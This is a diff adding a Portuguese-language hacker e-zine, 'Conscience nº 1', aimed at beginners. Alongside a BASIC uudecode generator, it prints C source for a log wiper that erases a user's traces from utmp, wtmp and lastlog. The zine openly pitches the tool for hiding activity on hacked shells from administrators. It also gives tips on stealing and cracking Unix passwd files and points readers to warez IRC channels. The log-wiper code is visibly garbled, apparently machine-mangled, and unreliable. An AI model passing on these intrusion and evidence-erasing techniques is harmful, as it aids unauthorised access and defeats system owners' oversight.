@@ -1,0 +1,424 @@
+#############################################################################
+#									    #
+#			Ezine Conscience - nº 1			 	    #
+#		                                                            #
+#		Feito por Silver-Ba - Silver-Ba@achei.net		    #
+#									    #
+#									    #
+#		  Obs. Não mude o conteudo desse zine!! 		    #
+#		    Leia. Pense e Tente! HeAvY FuN!!                        #
+#############################################################################
+    Obs. para usar o zine, use a tecla page down e não a barra de rolagem!
+
+Indice:
+
+			1- Introdução
+			2- Hacker?
+			3- Sistemas operacionais: UNIX e LINUX - parte 1
+			4- UUDECODE
+			5- Shells
+			6- Outros zines
+			7- Programas - Cracker Jack 1.4
+	                8- Artigo: Warez no IRC
+			9- Emails recebidos
+			10- Considerações finais
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+                             ### Introdução ###
+
+	Oi gente, aqui estou eu escrevendo esse zine, pode não ser dos
+melhores mas é o que eu estou fazendo :-)
+	Aqui vou poder colocar aquilo que sei e que quero passar pros outros,
+não ache que é copia de grandes zines como o axur05 e barata elétrica, mas vai
+conter algumas coisas deles 2, vamos dizer assim uma "seleção" das coisas que
+eu achar interessante neles.
+	Qualquer um pode me ajudar a fazer esse zine, basta mandar sua dica
+pra mim e se for boa, eu coloco, especifique tb se quer ser ou não mencionado
+(colocado o email) no zine.
+	Mandem criticas tb, (não é xingar! é critica construtiva :) e se for
+para pedir programas nem tentem pedir... simplesmente pq não posso mandar pra
+todos. (onde foi que eu já li isso...)
+	Tambem estava querendo montar ou participar de um grupo de estudo,
+sobre sistemas de computação, linguagens de programação e etc. Então, se pre-
+cisarem de mim... tow aqui!
+	Se alguns autores pensarem que eu estou copiando alguma coisa, por
+favor, não me entendam mal, não quero fazerr isso, se copiar eu coloco a
+fonte de onde foi retirada.
+	Bom... é isso, se esqueci alguma coisa.. depois eu falo pra vcs.
+				- Silver-Ba - O autor desse zine
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			     ### Hacker? ###
+
+	O que é um hacker? bom, hacker na concepção dos leigos é um cara que
+sai por ai detonando o computador dos outros e sabe mil coisas. Bom... ele é
+mais que isso, sabe linguagens de programação como ninguem, e não diz por ai
+que é o tal, (sem querer ofender quem faz isso) lê as vezes textos em outras
+linguas (não só o ingles. cruzes!! :)) e faz mais uma pancada de coisas.
+	Não me considero um hacker, continuo aprendendo um monte de coisa na
+internet, esse zine é para iniciantes e para pessoas curiosas em saber como
+um hacker age em determinadas situações (falei bonito :) ) estou fazendo uma
+parte disso, não gosto quando alguem chega pra mim e pergunta:
+	--- ei cara, vc sabe usar um mail bomb? me ensina?
+Não sei qual a graça em usar mail bomb, mas é o que as pessoas que entram na
+net veem de primeira, e pensam que usando isso "viram" hacker...
+	Sei que não posso me igualar a zines como a Axur05, mas posso fazer o
+que sei, e acho isso importante. (putz estou chorando de emoção :))
+	Se vc se consideram muito sabio delete esse zine do seu HD, ele não
+vai servir muito... Mas se vc é inexperiente e quer aprender leia-o e mande
+-me um email com sua opnião a respeito do zine, mande criticas, sugestões,
+e tudo mais :)
+	Vamos lá aperte a tecla PageDown e passe para a proxima sessão do
+zine, e aproveite :P
+	    					- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		### Sistemas operacionais: UNIX e LINUX ###
+
+	Os sistemas operacionais unix foram concebidos a muito tempo, em 19--
+e até hoje são usados, são usados na internet desde que ela foi criada, na e-
+poca da ARPANET, mas nem por isso são Sistemas obsoletos, ao contrário, são
+o que há de melhor em SO para a rede, o linux é uma versão do UNIX shareware
+ou seja vc não paga por ele de "cara" nem precisa piratea-lo :).
+	No zine axur05 nº2 tem o começo de uma lista dos comandos desses So's
+por isso não os colocarei aqui de novo. A proposito vc já ouviu falar em
+telnet? Ele faz com que vc use a maquina do mesmo jeito de como usaria se es-
+tivesse na frente dela, os comandos são todos de unix! Bom, não é grande coi-
+sa, mas é o basico :)
+	Veja na parte "Shell's" desse zine para ver como se consegue uma e tb
+como usa-la, pra que serve e etc.
+	Vamos falar nesse zine tb da linguagem de programação C, que é a usa-
+da em unix, e se não me engano o windows 3.1 foi feita nele. Pra vc sentir a
+"potencia" da linguagem. Mas isso é matéria pras proximas edições (se deus
+quiser).
+	As maiores façanhas que um hacker faz, ou as que mais impressionam,
+são feitas em um ambiente unix, o spoof por exemplo, que tb será esplicado.
+	Bom pra começo de conversa deve dar... qualquer sugestão me mandem um
+email! :)
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			    ### UUDECODE ###
+
+	Aí vai o codigo do uudecode em basic, para roda-lo use o programa
+qbasic do DOS, ele vai criar um arquivo chamado uudecode.com, ele será util
+em alguns momentos, se não souber usa-lo tente de novo até conseguir ou
+procure ajuda de alguem, mas não me procure :)
+	Obs. o codigo foi pego no zine Barata Elétrica nº 09
+--> Copie os codigos abaixo para um outro arquivo texto e abra no QBasic <--
+
+100 REM - BASIC PROGRAM TO CREATE UUDECODE.COM v2.0 (a fast uudecoder)
+105 REM UUDECODE.BAS created by w8sdz@SimTel.Coast.NET (Keith Petersen)
+110 CLS:PRINT "Creating UUDECODE.COM.  See UUDECODE.DOC for instructions."
+115 OPEN "UUDECODE.COM" AS #1 LEN = 1
+120 FIELD #1, 1 AS A$: CHECKSUM#=0
+130 FOR I = 1 TO    73
+140  LINESUM#=0: LOCATE 2,3: PRINT "Countdown: "    73 - I ;
+150  FOR J = 1 TO  16: READ BYTE$: BYTE = VAL("&H" + BYTE$)
+160   CHECKSUM# = CHECKSUM# + BYTE: LINESUM# = LINESUM# + BYTE
+170   IF (BYTE < 256) THEN LSET A$=CHR$(BYTE): PUT #1
+180  NEXT J
+190  READ LINETOT$: LINECHECK# = VAL("&H"+LINETOT$)
+200  IF LINECHECK# = LINESUM# THEN GOTO 220
+210  LOCATE 4,2: PRINT "Error in line #"  ;  260 +  10 * I: GOTO 260
+220 NEXT I
+230 CLOSE: READ FILETOT$ : FILECHECK# = VAL(FILETOT$)
+240 IF CHECKSUM# <> FILECHECK# THEN GOTO 260
+250 PRINT: PRINT "UUDECODE.COM created successfully": SYSTEM
+260 PRINT: PRINT "UUDECODE.COM is not valid!": END
+270 DATA EB,5F,90,49,6E,70,75,74,20,66,69,6C,65,20,65,72,  6A1
+280 DATA 72,6F,72,2E,4F,75,74,70,75,74,20,66,69,6C,65,20,  5F2
+290 DATA 65,72,72,6F,72,2E,73,74,61,72,74,20,6E,6F,74,20,  617
+300 DATA 66,6F,75,6E,64,2E,45,6E,64,20,6E,6F,74,20,66,6F,  5C7
+310 DATA 75,6E,64,2E,20,65,78,69,73,74,73,2E,20,41,62,6F,  595
+320 DATA 72,74,69,6E,67,21, 0, 0, 0, 0,AC, 3,AC, 3,5C, 3,  402
+330 DATA  0,E8,FA, 1,E8,54, 1,BF,5C, 3,E8,D1, 0,AD,3D,62,  743
+340 DATA 65,75,F4,AD,3D,67,69,75,EE,AD,3D,6E,20,75,E8,BF,  87F
+350 DATA 5C, 3,B4,20,AC,3A,C4,76,FB,AC,3A,C4,75,FB,AC,3A,  84E
+360 DATA C4,76,FB,3A,C4,74, 4,AA,AC,EB,F8,BA,5C, 3,33,C9,  8F9
+370 DATA 88, D,80,3E,60, 1,FF,74,1E,B4,4E,CD,21,3C, 2,74,  5E7
+380 DATA 16,3C,12,74,12,8B,CF,2B,CA,E8,2F, 1,BA,44, 1,B9,  609
+390 DATA 12, 0,B0, 5,E9,16, 1,B4,3C,CD,21,73, 3,E9,E3, 0,  5E7
+400 DATA A3,58, 1,BF,5C, 3,E8,65, 0,AC, A,C0,74,48,BB,20,  674
+410 DATA 20,2A,C3, A,C0,74,3F,32,E4,8B,E8,B9, 4, 6,AC,8A,  70C
+420 DATA E0,AC,8A,D0,2B,C3,D0,E4,D0,E4,D2,E8, A,C4,AA,4D,  ABB
+430 DATA 74,D4,8A,E2,AC,8A,D0,2B,C3,D2,E4,D0,E8,D0,E8, A,  AD8
+440 DATA C4,AA,4D,74,C1,8A,E2,AC,2B,C3,8A,CD,D2,E4, A,C4,  9D1
+450 DATA AA,4D,75,C7,EB,B0,E8,15, 0,AD,3D,65,6E,75, 5,AC,  7AE
+460 DATA 3C,64,74, 3,E8,AE, 0,E8,61, 0,B4,4C,CD,21,8B,36,  6A5
+470 DATA 5A, 1,89,3E,5E, 1,BD,50, 0,BF, C, 3,33,C0,AB,B9,  5B3
+480 DATA 27, 0,B8,20,20,F3,AB,BF, C, 3,3B,36,5C, 1,72, 6,  4D1
+490 DATA E8,38, 0,E8,55, 0,AC,3C,60,75, 4,B0,20,EB, 8,3C,  61D
+500 DATA  D,74,1B,3C, A,74,18,AA,4D,75,DF,3B,36,5C, 1,72,  4F9
+510 DATA  3,E8,37, 0,AC,3C, A,75,F2,BF,5C, 3,EB,B4,46,89,  707
+520 DATA 36,5A, 1,8B,3E,5E, 1,BE, C, 3,C3,BA,5C, 3,8B,CA,  5B7
+530 DATA 87, E,5E, 1,2B,CA,76, A,8B,1E,58, 1,B4,40,CD,21,  54D
+540 DATA 72, 1,C3,BA,14, 1,B9,12, 0,EB,22,BA,AC, 3,B9,54,  653
+550 DATA FA,8B,1E,56, 1,B4,3F,CD,21,72, C, B,C0,74, 8,8B,  62B
+560 DATA F2, 3,C6,A3,5C, 1,C3,BA, 3, 1,B9,11, 0,50,E8, A,  648
+570 DATA  0,58,E9,55,FF,BA,36, 1,B9, E, 0,52,51,BA,3E, 3,  5EB
+580 DATA B9, 2, 0,90,E8, C, 0,59,5A,E8, 7, 0,BA,3E, 3,B9,  595
+590 DATA  2, 0,90,BB, 2, 0,B4,40,CD,21,C3,90, D, A,54,68,  557
+600 DATA 69,73,20,50,72,6F,67,72,61,6D,20,52,65,71,75,69,  5FA
+610 DATA 72,65,73,20,44,4F,53,20,56,65,72,73,69,6F,6E,20,  576
+620 DATA 32,2E,30,20,6F,72,20,68,69,67,68,65,72,2E, D, A,  46D
+630 DATA 24, D, A,49,6E,70,75,74,20,70,61,74,68,2F,66,69,  516
+640 DATA 6C,65,3A,20,20,4E,6F,20,61,63,74,69,6F,6E,B4,30,  58A
+650 DATA CD,21,3C, 2,73, C,BA, C, 3,B4, 9,CD,21,B8, 1,4C,  524
+660 DATA CD,21,E8,46, 0,73,33,BA,68, 4,B9,1B, 1,90,E8,6A,  69F
+670 DATA FF,BA,41, 3,B9,14, 0,BB, 2, 0,B4,40,CD,21,BF,7F,  6A7
+680 DATA  0,C6, 5,50,8B,D7,B4, A,CD,21,E8,1E, 0,73, B,BA,  667
+690 DATA 55, 3,B9, 9, 0,B0, 1,E9,33,FF,BA, 4, 4,B8, 0,3D,  59D
+700 DATA CD,21,72, 4,A3,56, 1,C3,E9,1C,FF,BE,80, 0,BF, 4,  726
+710 DATA  4,FC,AC, A,C0,74,2F,B4,20,AC,3A,C4,76,FB,3A,C4,  806
+720 DATA 76,26,3C,2F,74, 4,3C,2D,75,18,8B,D0,8B, 4,3C,3F,  4DA
+730 DATA 74,1B,24,5F,3D,4F,20,8B,C2,75, 7,F6,16,60, 1,46,  53A
+740 DATA 46,AC,AA,AC,EB,D8,F9,C3,C6, 5, 0,F8,C3,BA,68, 4,  973
+750 DATA E9,66,FF,90,55,55,44,45,43,4F,44,45,20,76,32,2E,  622
+760 DATA 30, 0,4F,72,69,67,69,6E,61,6C,6C,79,20,62,79,20,  565
+770 DATA 54,68,65,6F,64,6F,72,65,20,41,2E,20,4B,61,6C,64,  565
+780 DATA 69,73, 0,54,68,6F,72,6F,75,67,68,6C,79,20,72,65,  608
+790 DATA 68,61,63,6B,65,64,20,62,79,20,44,61,76,69,64,20,  583
+800 DATA 50,20,4B,69,72,73,63,68,62,61,75,6D,2C,20,54,6F,  588
+810 DATA 61,64,20,48,61,6C,6C, 0,55,55,44,45,43,4F,44,45,  4B4
+820 DATA 20,5B,2D,3F,5D,5B,2D,6F,5D,20,5B,64,3A,5D,5B,5C,  4C5
+830 DATA 70,61,74,68,5C,5D,62,69,6E,61,72,79,2E,55,55,45,  608
+840 DATA 20,3C,52,45,54,55,52,4E,3E, D, A,55,73,69,6E,67,  497
+850 DATA 20,74,68,65,20,66,69,6C,65,6E,61,6D,65,2E,74,79,  5DD
+860 DATA 70,20,69,6E,20,74,68,65,20,22,62,65,67,69,6E,22,  531
+870 DATA 20,6C,69,6E,65,2C, D, A,70,72,6F,64,75,63,65,73,  570
+880 DATA 20,75,75,64,65,63,6F,64,65,64,20,66,69,6C,65,6E,  600
+890 DATA 61,6D,65,2E,74,79,70,20,6F,6E,20,63,75,72,72,65,  5FC
+900 DATA 6E,74,20,64,72,69,76,65,5C,70,61,74,68, D, A,28,  564
+910 DATA 70,72,6F,76,69,64,69,6E,67,20,66,69,6C,65,6E,61,  661
+920 DATA 6D,65,2E,74,79,70,20,64,6F,65,73,6E,27,74,20,61,  5B2
+930 DATA 6C,72,65,61,64,79,20,65,78,69,73,74,29,2E, D, A,  53C
+940 DATA 2D,6F,20,73,77,69,74,63,68,20,66,6F,72,63,65,73,  5F0
+950 DATA 20,6F,76,65,72,77,72,69,74,65,20,6F,66,20,65,78,  5F9
+960 DATA 69,73,74,69,6E,67,20,66,69,6C,65,6E,61,6D,65,2E,  61D
+970 DATA 74,79,70, D, A,2D,3F,20,70,72,6F,64,75,63,65,73,  565
+980 DATA 20,74,68,69,73,20,68,65,6C,70,20,6D,65,73,73,61,  5DA
+990 DATA 67,65,2E, D, A,24, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  135
+1000 DATA 114365
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			    ### Shells ###
+
+	Não, não é um posto de gasolina, shell é como se chama as contas em
+máquinas ligadas à net 24h, tipo os provedores.
+	Existem 3 tipos de servidores de unix que ficam indefinidamente liga-
+das a net:
+		I- HTTP
+		II- FTP
+		III- SMTP (servidor de mail)
+	Elas são as que mais sofrem tentativas de ataques dos hackers, porque
+ter uma boa shell é indispensavel, pois são nelas que se coloca os programas
+em linguagem C (ver matéria sobre UNIX e LINUX).
+
+a) Como ter uma Shell legalmente e gratis?
+	Bom exite uma maneira facil, mas tem limitações tipo: vc não pode
+usa-la para rastrear portas e etc. é a CYBERSPACE.ORG.
+	Vá em www.cyberspace.org e faça seu cadastro, pegue sua senha e login
+e vamos usa-la, dentro das suas limitações é claro.
+	*Obs. Se quiser uma shell sem limitações, tente arranjar pelo IRC com
+alguma alma boa, ou leia a Axur05 nº 1 e aprenda a quebrar senhas, ou espere
+as proximas edições do Conscience ;-)*
+
+b) Como entrar na Shell?
+	Existe 2 tipos de jeitos de usar a shell, a 1ª é para mandar arquivos
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+- Continuação... -
+
+para lá, que é usando um programa de FTP e entrar em: ftp.cyberspace.org com
+sua senha e login no lugar de anonymous e seu email (que é comumente usado).
+	A outra maneira é usar um programa de TELNET (no windows tem um desse, se
+chama TELNET.EXE) e entrar no servidor, tb com o host ftp.cyberspace.org
+
+b) Quais arquivos eu coloco lá?
+	Os arquivos colocados são arquivos .c que são codigos da linguagem C
+já mencionados nessa edição. Eles são compilados na maquina atraves de coman-
+dos seus atraves do telnet. Vamos esperimentar fazer isso? Primeiro copie os
+codigos abaixo para um arquivo texto e salve como clean.c NÃO É CLEAN.TXT
+
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/file.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;utmp.h&gt;
+#include &lt;pwd.h&gt;
+#include &lt;lastlog.h&gt;
+
+#define  &quot;/usr/adm/wtmp&quot WTMP_NAME;
+#define  &quot;/etc/utmp&quotUTMP_NAME;
+#define  &quot;/usr/adm/lastlog&quot LASTLOG_NAME;
+
+int f;
+
+the empty kill_utmp (who) char *who; {utmp_ent of struct utmp;
+
+if ((f=open(UTMP_NAME,O_RDWR)) &gt;=0) {while ( reads (f,
+&amp;utmp_ent,(utmp_ent)) sizeof &gt; 0) if
+(!strncmp(utmp_ent.ut_name,who,strlen(wh{bzero ((*) char &amp;utmp_ent,sizeof
+(utmp_ent)); lseek (f, - ((utmp_ent) of sizeof), SEEK_CUR); writes (f,
+&amp;utmp_ent, (utmp_ent)de sizeof);} they close (f);}}
+
+the empty kill_wtmp (who) char *who; {utmp_ent of struct utmp; poslongo;
+
+it put it = 1L; if ((f=open(WTMP_NAME,O_RDWR)) &gt;=0) {
+
+while (powders! = -1L) {lseek(f,-(long) ((sizeof (struct utmp)) * pos),L_XTND);
+if ( reads (f, &amp;utmp_ent, sizeof (struct utmp)) &lt;0) {it put = -1L;} more
+{if (!strncmp(utmp_ent.ut_name,who,strlen(wh {bzero ((utmp *) char
+&amp;utmp_ent,sizeof(struct)); lseek(f, - ((sizeof (utmp destruct)) * it put)
+,L_XTND); [sbrk] writes (f, &amp;utmp_ent, (utmp_ent) desizeof); it put = -1L;}
+more powders + = 1L;}}  closes (f);}}
+
+the empty kill_lastlog (who) char *who; {struct passwd *pwd; newll struct
+delastlog;
+
+if ((pwd=getpwnam(who)) !=NULL) {
+
+if ((f=open(LASTLOG_NAME, O_RDWR)) &gt; = 0) {lseek (f,(long)pwd-&gt;pw_uid *
+sizeof (struct lastlog), 0); bzero ((*) char &amp;newll,sizeof (newll)); writes
+(f, (*) char,sizeof &amp;newll (newll)); closes (f);}
+
+} more printf (? \092n&quot;,who &quot;%s:);}
+
+main (argc, argv) int argc; *argv [of char]; {if
+(argc==2){kill_lastlog(argv[1]); kill_wtmp(argv[1]); kill_utmp(argv[1]);
+printf(&quot;Zap2!\092n&quot;);} more printf (&quot;Error.\092n&quot;);}
+
+----------------------------- fim do codigo ---------------------------------
+	Depois vá no seu programa de FTP (um bom é o CUTEftp) e entre na sua
+shell para mandar esse arquivo pra lá. Quando terminar a transferência entre
+no programa de Telnet e use-o pra entrar na sua conta shell.
+	Agora vc vai COMPILAR esse programa, e fara esse mesmo processo quan-
+do for compilar qualquer outro em linguagem c.
+	Depois de entrar na shell digite: cc -o clean clean.c
+	Onde CC é o comando; -o é a opção; CLEAN é o nome do prog compilado e
+CLEAN.C é o nome do arquivo fonte que vc criou com o codigo acima.
+	Para utilizar o programa depois disso, basta digitar: ./clean e ele
+será executado.
+	Obs. Esse programa é um apagador de log's, é usado para que nenhum
+administrador de Shells (root) descubram que vcs estiveram na maquina e o que
+fizeram lá, muito util em shell's hackeadas. :-)
+					- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			     ### Outros zines ###
+
+	Esse espaço não é propaganda de outros zines, mas é para apresentar a
+você outras publicações da rede :-) minha pontuação vai de 0 a 5
+
+- Axur 05 - Otimo Zine de Hacker, coloca vários sources (codes) de programas em
+várias linguagens de programação. Muito bom mesmo. NOTA 5
+	Onde Arranjar: http://www.axur05.org
+
+- Barata Eletrica - Muito Bom tambem, mas não ensina como fazer as coisas como
+a Axur05, mas se ler ele pode ser que vc goste do estilo. NOTA 4,3
+	Onde arranjar: http://www.inf.ufsc.br/barata
+
+- UHB zine - Ainda na primeira edição, não pegou o pique que promete ter, mas
+deve se tornar um grande zine. NOTA 3.0
+	Onde arranjar: não sei ao certo, consegui no irc mas tente:
+http://www.uhb.org ou http://www.dominio.uhb.org
+
+	Por enquanto apenas esses merecem estar aqui, se você faz um zine me
+diga para menciona-lo aqui. é free :-)
+	Na proxima edição tem mais, e possivelmente zines estrangeiros tambem
+
+						- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			    ### Programas ###
+
+	Nessa seção vão ser mostrados programas para uso em geral, nessa edi-
+ção o escolhido foi o Cracker Jack 1.4, que é o mais usado para quebrar ar-
+quivos passwd que são os arquivos que guardam as senhas das maquinas unix e
+linux (para mais informações leia os zines: axur05 nº2 e UHB zine nº0).
+	Na verdade lendo os zines acima vc não terá mais nenhuma duvida sobre
+esse programa. Mas se continuar com mais alguns cacoetes :-) leia as dicas
+abaixo:
+
+1- Tente pegar os arquivos PASSWD's em provedores novos e servidores de FTP's
+dos mesmos.
+
+2- Veja se ele está com Shadow (para saber se está ou não veja se na parte de
+senha encriptada ele está com um 0 ou * , se estiver é pq está com shadow
+sim, mas ai é mais facil e menos cansativo partir pra outra).
+
+3- Use uma boa Wordlist para desencriptar as senhas, breve quando eu montar
+a Homepage do Conscience (é o nome desse zine esqueceu?) vou colocar uma pra
+download.
+
+4- Se conseguir a senha do root e não souber usa-la... começe a chorar  :)
+					- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+		     ### Artigo: Warez no IRC ###
+
+	Eu uso muito a rede Brasirc de irc, apenas pra me divertir, mas uma
+vez quando passava pela EFFnet me deparei com uma coisa que as vezes não per-
+cebia; o Warez na rede, o warez é tambem conhecido como pirataria, ou copia
+de programas com copyright. Isso é ilegal, mas na Internet acontece muito
+na EFFnet há canais dedicados a isso, como a #warez, #warezwarez e outros
+	Lá são colocados bots para passar programas e várias pessoas anunciam
+troca de softwares pirateados, alguns utilizam o Serv-u para ter um servidor
+temporario de FTP e facilitar as trocas.
+	A quantidade de pessoas que fica por lá é muito grande se comparada
+com os canais da Brasnet e Brasirc, e os programas que são trocados lá, valem
+muito em termo de quantidades de copias e valor de mercado. Mas eles não es-
+tão interessados em dinheiro, mas apenas no gostinho de ter alguns milhares
+de dolares em seus HD's.
+	Se você quiser se aventurar no warez, saiba que nada lá é de graça...
+tudo tem um preço e a moeda são outros programas que serão usados.
+	Tente os servidores da EFFnet: irc.magic.mb.ca, irc-2.kern.com ou
+opus.bridge.net.
+	Existem muitas pessoas lá, todas com sede de softwares, e cuidado
+para não ser enganado! :-)
+					- Silver-Ba -
+
+################# Aperte a tecla PageDown para continuar... #################
+#############################################################################
+
+			    ### Emails Recebidos ###
+
+	Como é a primeira edição do Conscience, não tem nenhum email para
+colocar aqui. Espero que me mandem mails para a colocar na proxima edição :-)
+
+#############################################################################
+
+			### Considerações Finais ###
+
+	Bom, como não poderia deixar de ser, tenho que avisar que não me res-
+ponsabilizo por nada que esteja escrito aqui. Se fizer qualquer coisa que
+aqui for mencionado, assuma depois!
+	E tambem torço para que todos vocês me deem apoio para que eu possa
+continuar a escrever esse zine e sempre torna-lo melhor.
+
+            =-=-=-=-=- O Conscience é de todos nós! =-=-=-=-=-
+
+Autor: Silver-Ba
+Email: Silver-Ba@achei.net
+IRC Server: irc.stc.com.br - Canal #Amigos
+
+##################### Aperte ALT + F4  para continuar... ####################
+#############################################################################
